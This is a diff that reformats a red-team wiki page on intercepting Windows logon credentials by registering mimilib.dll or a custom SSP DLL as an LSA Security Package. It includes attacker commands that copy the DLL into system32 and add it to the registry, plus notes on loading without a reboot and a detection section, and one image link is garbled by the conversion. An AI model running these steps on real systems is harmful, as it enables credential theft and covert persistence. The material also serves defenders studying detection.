@@ -1,5 +1,6 @@
 ---
 description: Credential Access, Persistence
+tags: [#credential-access, #persistence]
 ---
 
 # Intercepting Logon Credentials via Custom Security Support Provider and Authentication Packages
@@ -14,44 +15,40 @@ Once the Security Package is registered and the system is rebooted, the mimilib.
 
 Let's now build the [mimilib.dll](https://github.com/gentilkiwi/mimikatz) and copy it to the target machine's system32 folder:
 
-{% code title="attacker@target" %}
 ```cpp
+// attacker@target
 PS C:\> copy mimilib.dll %systemroot%\system32
 ```
-{% endcode %}
 
 Get a list existing LSA Security Packages:
 
-{% code title="attacker@target" %}
 ```bash
+// attacker@target
 PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
 
 HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
     Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
 ```
-{% endcode %}
 
 Add mimilib.dll to the Security Support Provider list (Security Packages):
 
-{% code title="attacker@target" %}
 ```csharp
+// attacker@target
 PS C:\> reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ /f
 ```
-{% endcode %}
 
 The below shows `Security Packages` registry value with the `mimilib` added and the `kiwissp.log` file with a redacted password that had been logged during the user logon (after the system had been rebooted after the Security Package was registered):
 
-![](../../.gitbook/assets/lsa-security-packages.png)
+![[lsa-security-packages.png]]
 
-{% hint style="info" %}
-Reboot is required for the new SSP to take effect after it's been added to the Security Packages  list.
-{% endhint %}
+> [!INFO]
+> Reboot is required for the new SSP to take effect after it's been added to the Security Packages  list.
 
 ## Loading SSP without Reboot
 
 It's possible to load the SSP DLL without modifying the registry:
 
-![](<../../.gitbook/assets/image (423).png>)
+![[image (423).png]]
 
 Below code loads the malicious SSP spotless.dll:
 
@@ -74,11 +71,10 @@ int main()
 
 Below shows how the new Security Package spotless.dll is loaded by lsass and is effective immediately:
 
-![procmon filter: path contains "spotless"](../../.gitbook/assets/load-ssp.gif)
+![[load-ssp.gif|procmon filter: path contains "spotless"]]
 
-{% hint style="info" %}
-Loading the SSP with this approach does not survive a reboot unlike SSPs that are loaded as registered Security Packages via registry.
-{% endhint %}
+> [!INFO]
+> Loading the SSP with this approach does not survive a reboot unlike SSPs that are loaded as registered Security Packages via registry.
 
 ## Detection
 
@@ -86,11 +82,11 @@ It may be worth monitoring `Security Packages` value in`hklm\system\currentcontr
 
 Newly added packages should be inspected:
 
-![](../../.gitbook/assets/lsa-commandline.png)
+![[lsa-commandline.png]]
 
 Additionally, mimilib.dll (same applies to custom spotless.dll) can be observed in the list of DLLs loaded by lsass.exe, so as a defender, you may want to make a baseline of loaded known good DLLs of the lsass process and monitor it for any new suspicious DLLs:
 
-![](<../../.gitbook/assets/Screenshot from 2018-07-24 23-08-39 (1) (1).png>)
+![[Screenshot from 2018-07-24 23-08-39 (1]] (1).png>)
 
 ## Code
 
@@ -156,14 +152,14 @@ extern "C" __declspec(dllexport) NTSTATUS NTAPI SpLsaModeInitialize(ULONG LsaVer
 
 ## References
 
-{% embed url="https://github.com/gentilkiwi/mimikatz" %}
+[github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)
 
-{% embed url="https://docs.microsoft.com/en-us/windows/win32/secauthn/lsa-mode-initialization" %}
+[docs.microsoft.com/en-us/windows/win32/secauthn/lsa-mode-initialization](https://docs.microsoft.com/en-us/windows/win32/secauthn/lsa-mode-initialization)
 
-{% embed url="https://github.com/veramine/Detections/wiki/LSA-Packages" %}
+[github.com/veramine/Detections/wiki/LSA-Packages](https://github.com/veramine/Detections/wiki/LSA-Packages)
 
-{% embed url="https://adsecurity.org/?p=1760" %}
+[adsecurity.org/?p=1760](https://adsecurity.org/?p=1760)
 
-{% embed url="https://attack.mitre.org/wiki/Technique/T1131" %}
+[attack.mitre.org/wiki/Technique/T1131](https://attack.mitre.org/wiki/Technique/T1131)
 
-{% embed url="https://blog.xpnsec.com/exploring-mimikatz-part-2/" %}
+[blog.xpnsec.com/exploring-mimikatz-part-2](https://blog.xpnsec.com/exploring-mimikatz-part-2/)
